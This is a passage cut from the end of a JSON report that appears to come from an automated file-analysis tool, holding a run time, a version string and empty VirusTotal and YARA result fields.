    },
    "time": "0:00:00.521106",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
